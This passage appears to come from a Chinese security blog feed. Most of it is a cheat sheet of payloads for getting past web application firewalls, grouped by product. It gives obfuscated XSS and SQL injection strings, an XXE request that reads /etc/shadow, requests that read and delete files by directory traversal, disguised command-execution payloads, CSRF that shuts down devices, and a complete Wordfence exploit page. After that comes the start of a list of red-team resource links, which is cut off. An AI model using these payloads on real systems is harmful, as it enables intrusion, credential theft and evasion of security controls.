<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p draggable=True ondragstart=prompt()&gt;alert</span><br><span class="line">&lt;bleh/ondragstart=&amp;Tab;parent&amp;Tab;[&#x27;open&#x27;]&amp;Tab;&amp;lpar;&amp;rpar;%20draggable=True&gt;dragme</span><br><span class="line">GET - XSS Bypass (v4.02) by @DavidK</span><br><span class="line"></span><br><span class="line">/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;WTF&quot; onError=&quot;&#123;var</span><br><span class="line">&#123;3:s,2:h,5:a,0:v,4:n,1:e&#125;=&#x27;earltv&#x27;&#125;[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B</span><br><span class="line">h%2Bn)(/0wn3d/.source)&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>POST - XSS Bypass (v4.02) by @DavidK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;WTF&quot; onError=&quot;&#123;var</span><br><span class="line">&#123;3:s,2:h,5:a,0:v,4:n,1:e&#125;=&#x27;earltv&#x27;&#125;[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/</span><br><span class="line">.source)&quot; /&gt;</span><br><span class="line">clave XSS (v4.02) by @DavidK</span><br><span class="line">/?&amp;idPais=3&amp;clave=%3Cimg%20src=%22WTF%22%20onError=%22&#123;</span><br></pre></td></tr></table></figure>

<h3 id="Fortinet-Fortiweb"><a href="#Fortinet-Fortiweb" class="headerlink" title="Fortinet Fortiweb"></a><strong>Fortinet Fortiweb</strong></h3><p><code>pcre_expression</code> unvaidated XSS by @Benjamin Mejri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/waf/pcre_expression/validate?redir=/success&amp;mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C</span><br><span class="line">/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&amp;mkey=0</span><br></pre></td></tr></table></figure>

<p>CSP Bypass by @Binar10</p>
<p>POST Type Query</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /&lt;path&gt;/login-app.aspx HTTP/1.1</span><br><span class="line">Host: &lt;host&gt;</span><br><span class="line">User-Agent: &lt;any valid user agent string&gt;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: &lt;the content length must be at least 2399 bytes&gt;</span><br><span class="line"></span><br><span class="line">var1=datavar1&amp;var2=datavar12&amp;pad=&lt;random data to complete at least 2399 bytes&gt;</span><br></pre></td></tr></table></figure>

<p>GET Type Query</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;domain&gt;/path?var1=vardata1&amp;var2=vardata2&amp;pad=&lt;large arbitrary data&gt;</span><br></pre></td></tr></table></figure>

<h3 id="F5-ASM"><a href="#F5-ASM" class="headerlink" title="F5 ASM"></a><strong>F5 ASM</strong></h3><p>XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(1)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&quot;/&gt;&lt;marquee onfinish=confirm(123)&gt;a&lt;/marquee&gt;</span><br></pre></td></tr></table></figure>

<h3 id="F5-BIG-IP"><a href="#F5-BIG-IP" class="headerlink" title="F5 BIG-IP"></a><strong>F5 BIG-IP</strong></h3><p>XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;[DATA]&quot;&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;[DATA]&quot;&gt;</span><br><span class="line">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Aatif Khan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot;onshow=&quot;prom%25%32%33%25%32%36x70;t(1)“&gt;</span><br></pre></td></tr></table></figure>

<p><code>report_type</code> XSS by @NNPoster</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+</span><br></pre></td></tr></table></figure>

<p>POST Based XXE by @Anonymous</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /sam/admin/vpe2/public/php/server.php HTTP/1.1</span><br><span class="line">Host: bigip</span><br><span class="line">Cookie: BIGIPAuthCookie=*VALID_COOKIE*</span><br><span class="line">Content-Length: 143</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&#x27;utf-8&#x27; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM &#x27;/etc/shadow&#x27;&gt; ]&gt;</span><br><span class="line">&lt;message&gt;&lt;dialogueType&gt;&amp;e;&lt;/dialogueType&gt;&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p>Directory Traversal by @Anastasios Monachos</p>
<p>Read Arbitrary File</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&amp;name=../../../../../etc/passwd</span><br><span class="line">Delete Arbitrary File</span><br><span class="line">POST /tmui/Control/form HTTP/1.1</span><br><span class="line">Host: site.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=&quot;&quot;; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage=&quot;/tmui/system/archive/properties.jsp?&amp;name=../../../../../etc/passwd&quot;; f5currenttab=&quot;main&quot;; f5mainmenuopenlist=&quot;&quot;; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwd</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">_form_holder_opener_=&amp;handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;showObjList=&amp;showObjList_before=&amp;hideObjList=&amp;hideObjList_before=&amp;enableObjList=&amp;enableObjList_before=&amp;disableObjList=&amp;disableObjList_before=&amp;_bufvalue=icHjvahr354NZKtgQXl5yh2b&amp;_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&amp;_bufvalue_validation=NO_VALIDATION&amp;com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;linked_add_id=&amp;linked_add_id_before=&amp;name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&amp;form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&amp;download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;restore_before=Restore&amp;delete=Delete&amp;delete_before=Delete</span><br></pre></td></tr></table></figure>

<h3 id="F5-FirePass"><a href="#F5-FirePass" class="headerlink" title="F5 FirePass"></a><strong>F5 FirePass</strong></h3><p>SQLi Bypass from @Anonymous</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">state=%2527+and+</span><br><span class="line">(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+</span><br><span class="line">BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+</span><br></pre></td></tr></table></figure>

<h3 id="ModSecurity"><a href="#ModSecurity" class="headerlink" title="ModSecurity"></a><strong>ModSecurity</strong></h3><p>RCE Payloads Detection Bypass for PL3 by @theMiddle (v3.1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;+$u+cat+/etc$u/passwd$u</span><br></pre></td></tr></table></figure>

<p>RCE Payloads Detection Bypass for PL2 by @theMiddle (v3.1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;+$u+cat+/etc$u/passwd+\#</span><br></pre></td></tr></table></figure>

<p>RCE Payloads for PL1 and PL2 by @theMiddle (v3.0)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/??t+/???/??ss??</span><br></pre></td></tr></table></figure>

<p>RCE Payloads for PL3 by @theMiddle (v3.0)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?in/cat+/et?/passw?</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Johannes Dahse (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Yuri Goltsev (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 AND (select DCount(last(username)&amp;after=1&amp;after=1) from users where username=&#x27;ad1min&#x27;)</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Ahmad Maulana (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-</span><br><span class="line">SQLi Bypass by @Travis Lee (v2.2)</span><br><span class="line">amUserId=1 union select username,password,3,4 from users</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Roberto Salgado (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Georgi Geshev (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%0bAND(SELECT%0b1%20FROM%20mysql.x)</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @SQLMap Devs (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @HackPlayers (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201</span><br></pre></td></tr></table></figure>

<h3 id="Imperva"><a href="#Imperva" class="headerlink" title="Imperva"></a><strong>Imperva</strong></h3><p>Imperva SecureSphere 13 - Remote Command Execution by @rsp3ar</p>
<p>XSS Bypass by @David Y</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload\r\n=$.globalEval(&quot;al&quot;+&quot;ert()&quot;);&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Emad Shanab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=self[`aler`%2b`t`]`1`&gt;</span><br><span class="line">anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @i_bo0om</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javas&amp;Tab;cript:al&quot;+&quot;ert``&quot;&#x27;;&gt;</span><br><span class="line">&lt;img/src=q onerror=&#x27;new Function`al\ert\`1\``&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @c0d3g33k</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&#x27;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @DRK1WI</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15 and &#x27;1&#x27;=(SELECT &#x27;1&#x27; FROM dual) and &#x27;0having&#x27;=&#x27;0having&#x27;</span><br></pre></td></tr></table></figure>

<p>SQLi by @Giuseppe D’Amore</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stringindatasetchoosen%%&#x27; and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like &#x27;%%dministrator&#x27; and rownum&lt;=1 and PASSWORD like &#x27;0%&#x27;) and &#x27;1%%&#x27;=&#x27;1</span><br><span class="line">Imperva SecureSphere &lt;= v13 - Privilege Escalation by @0x09AL</span><br></pre></td></tr></table></figure>

<h3 id="Kona-SiteDefender"><a href="#Kona-SiteDefender" class="headerlink" title="Kona SiteDefender"></a><strong>Kona SiteDefender</strong></h3><p>HTML Injection by @sp1d3rs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Jonathan Bouman</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body%20alt=al%20lang=ert%20onmouseenter=&quot;top[&#x27;al&#x27;+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)&quot;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @zseano</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?&quot;&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\mysite&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;abc/onmouseenter=confirm%60%60&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @sp1d3rs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Frans Rosén</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;@keyframes a&#123;&#125;b&#123;animation:a;&#125;&lt;/style&gt;&lt;b/onanimationstart=prompt`$&#123;document.domain&#125;&amp;#x60;&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Ishaq Mohammed</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;marquee+loop=1+width=0+onfinish=&#x27;new+Function`al\ert\`1\``&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Profense"><a href="#Profense" class="headerlink" title="Profense"></a><strong>Profense</strong></h3><p>GET Type CSRF Attack by @Michael Brooks (&gt;= v.2.6.2)</p>
<p>Turn off Proface Machine</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=https://host:2000/ajax.html?action=shutdown&gt;</span><br></pre></td></tr></table></figure>

<p>Add a proxy</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=https://10.1.1.199:2000/ajax.html?vhost_proto=http&amp;vhost=vhost.com&amp;vhost_port=80&amp;rhost_proto=http&amp;rhost=10.1.1.1&amp;rhost_port=80&amp;mode_pass=on&amp;xmle=on&amp;enable_file_upload=on&amp;static_passthrough=on&amp;action=add&amp;do=save&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Michael Brooks (&gt;= v.2.6.2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://host:2000/proxy.html?action=manage&amp;main=log&amp;show=deny_log&amp;proxy=&gt;&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @EnableSecurity (&gt;= v2.4)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%3CEvil%20script%20goes%20here%3E=%0AByPass</span><br><span class="line">%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E</span><br></pre></td></tr></table></figure>

<h3 id="QuickDefense"><a href="#QuickDefense" class="headerlink" title="QuickDefense"></a><strong>QuickDefense</strong></h3><p>XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?&lt;input type=&quot;search&quot; onsearch=&quot;aler\u0074(1)&quot;&gt;</span><br><span class="line">&lt;details ontoggle=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Sucuri"><a href="#Sucuri" class="headerlink" title="Sucuri"></a><strong>Sucuri</strong></h3><p>Smuggling RCE Payloads by @theMiddle</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/??t+/???/??ss??</span><br></pre></td></tr></table></figure>

<p>Obfuscating RCE Payloads by @theMiddle</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;+cat+/e&#x27;tc/pass&#x27;wd</span><br><span class="line">c\\a\\t+/et\\c/pas\\swd</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Luka</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;input/onauxclick=&quot;[1].map(prompt)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Brute Logic</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:text/html,&lt;form action=https://brutelogic.com.br/xss-cp.php method=post&gt;</span><br><span class="line">&lt;input type=hidden name=a value=&quot;&lt;img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`&gt;&quot;&gt;</span><br><span class="line">&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h3 id="URLScan"><a href="#URLScan" class="headerlink" title="URLScan"></a><strong>URLScan</strong></h3><p>Directory Traversal by @ZeQ3uL (&lt;= v3.1) (Only on ASP.NET)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://host.com/test.asp?file=.%./bla.txt</span><br></pre></td></tr></table></figure>

<h3 id="WebARX"><a href="#WebARX" class="headerlink" title="WebARX"></a><strong>WebARX</strong></h3><p>Cross Site Scripting by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a69/onauxclick=open&amp;#40&amp;#41&gt;rightclickhere</span><br></pre></td></tr></table></figure>

<h3 id="WebKnight"><a href="#WebKnight" class="headerlink" title="WebKnight"></a><strong>WebKnight</strong></h3><p>Cross Site Scripting by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;</span><br><span class="line">&lt;details ontoggle=alert(1)&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onwheel=prompt(1)&gt;</span><br></pre></td></tr></table></figure>

<p>SQLi by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 union(select 1,username,password from(users))</span><br><span class="line">0 union(select 1,@@hostname,@@datadir)</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Aatif Khan (v4.1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;details ontoggle=alert(1)&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @ZeQ3uL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)</span><br></pre></td></tr></table></figure>

<h3 id="Wordfence"><a href="#Wordfence" class="headerlink" title="Wordfence"></a><strong>Wordfence</strong></h3><p>XSS Bypass by @brute Logic</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javas&amp;#99;ript:alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a/**/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&amp;colon;/**/alert()/**/&gt;click</span><br></pre></td></tr></table></figure>

<p>HTML Injection by @Voxel</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://host/wp-admin/admin-ajax.php?action=revslider_show_image&amp;img=../wp-config.php</span><br></pre></td></tr></table></figure>

<p>XSS Exploit by @MustLive (&gt;= v3.3.5)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Wordfence Security XSS exploit (C) 2012 MustLive.</span><br><span class="line">http://websecurity.com.ua&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onLoad=&quot;document.hack.submit()&quot;&gt;</span><br><span class="line">&lt;form name=&quot;hack&quot; action=&quot;http://site/?_wfsf=unlockEmail&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;email&quot;</span><br><span class="line">value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>Other XSS Bypasses</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meter onmouseover=&quot;alert(1)&quot;</span><br><span class="line">&#x27;&quot;&gt;&gt;&lt;div&gt;&lt;meter onmouseover=&quot;alert(1)&quot;&lt;/div&gt;&quot;</span><br><span class="line">&gt;&gt;&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Apache-Generic"><a href="#Apache-Generic" class="headerlink" title="Apache Generic"></a><strong>Apache Generic</strong></h3><p>Writing method type in lowercase by @i_bo0om</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get /login HTTP/1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure>

<h3 id="IIS-Generic"><a href="#IIS-Generic" class="headerlink" title="IIS Generic"></a><strong>IIS Generic</strong></h3><p>Tabs before method by @i_bo0om</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /login.php HTTP/1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>waf</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防测试手册</title>
    <url>/2020/05/02/%E6%94%BB%E9%98%B2%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<h3 id="攻防测试手册"><a href="#攻防测试手册" class="headerlink" title="攻防测试手册"></a>攻防测试手册</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://micropoor.blogspot.com/2019/01/php8.html PHP 安全新闻早 8 点课程系列高持续渗透--Microporor</span><br><span class="line"></span><br><span class="line">https://github.com/Micropoor/Micro8 Microporor 高级攻防 100 课</span><br><span class="line"></span><br><span class="line">https://github.com/maskhed/Papers 包含 100 课等经典攻防教材、安全知识</span><br><span class="line"></span><br><span class="line">https://github.com/infosecn1nja/AD-Attack-Defense 红蓝方攻防手册</span><br><span class="line"></span><br><span class="line">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming 优秀红队资源列表</span><br><span class="line"></span><br><span class="line">https://github.com/foobarto/redteam-notebook 红队标准渗透测试流程+常用命令</span><br><span class="line"></span><br><span class="line">https://github.com/tom0li/collection-document 文章收集：安全部、SDL、src、渗透测试、漏洞利用</span><br><span class="line"></span><br><span class="line">https://github.com/kbandla/APTnotes 各种公开的文件和相关的 APT 笔记，还有软件样本</span><br><span class="line"></span><br><span class="line">https://wizardforcel.gitbooks.io/web-hacking-101/content Web Hacking 101 中文版</span><br><span class="line"></span><br><span class="line">https://techvomit.net/web-application-penetration-testing-notes/ web 渗透测试笔记</span><br><span class="line"></span><br><span class="line">https://github.com/qazbnm456/awesome-web-security Web 安全资料和资源列表</span><br><span class="line"></span><br><span class="line">http://pentestmonkey.net/category/cheat-sheet 渗透测试常见条目</span><br><span class="line"></span><br><span class="line">https://github.com/demonsec666/Security-Toolkit 渗透攻击链中常用工具及使用场景</span><br><span class="line"></span><br><span class="line">https://github.com/Kinimiwar/Penetration-Testing 渗透测试方向优秀资源收集</span><br><span class="line"></span><br><span class="line">https://github.com/jshaw87/Cheatsheets 渗透测试/安全秘籍/笔记</span><br></pre></td></tr></table></figure>

<h3 id="学习手册相关资源"><a href="#学习手册相关资源" class="headerlink" title="学习手册相关资源"></a>学习手册相关资源</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/HarmJ0y/CheatSheets 多个项目的速查手册（Beacon / Cobalt Strike，PowerView，PowerUp，Empire 和 PowerSploit）</span><br><span class="line"></span><br><span class="line">https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/ Kali Linux Web 渗透测试秘籍中文版</span><br><span class="line"></span><br><span class="line">https://github.com/louchaooo/kali-tools-zh kali 下工具使用介绍手册</span><br><span class="line"></span><br><span class="line">https://www.offensive-security.com/metasploit-unleashed/ kali 出的 metasploit 指导笔记</span><br><span class="line"></span><br><span class="line">http://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/ hydra 使用手册</span><br><span class="line"></span><br><span class="line">https://www.gitbook.com/book/t0data/burpsuite/details burpsuite 实战指南</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/26618074 Nmap 扩展脚本使用方法</span><br><span class="line"></span><br><span class="line">https://somdev.me/21-things-xss/ XSS 的 21 个扩展用途</span><br><span class="line"></span><br><span class="line">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ sql 注入 sheet 表</span><br><span class="line"></span><br><span class="line">https://sqlwiki.netspi.com/ 你要的 sql 注入知识点都能找到</span><br><span class="line"></span><br><span class="line">https://github.com/kevins1022/SQLInjectionWiki 一个专注于聚合和记录各种 SQL 注入方法的 wiki</span><br><span class="line"></span><br><span class="line">https://github.com/hardenedlinux/linux-exploit-development-tutorial Linux exploit 开发入门</span><br><span class="line"></span><br><span class="line">https://wizardforcel.gitbooks.io/asani/content 浅入浅出 Android 安全 中文版</span><br><span class="line"></span><br><span class="line">https://wizardforcel.gitbooks.io/lpad/content Android 渗透测试学习手册 中文版</span><br><span class="line"></span><br><span class="line">https://github.com/writeups/ios ios 漏洞 writeup 笔记</span><br><span 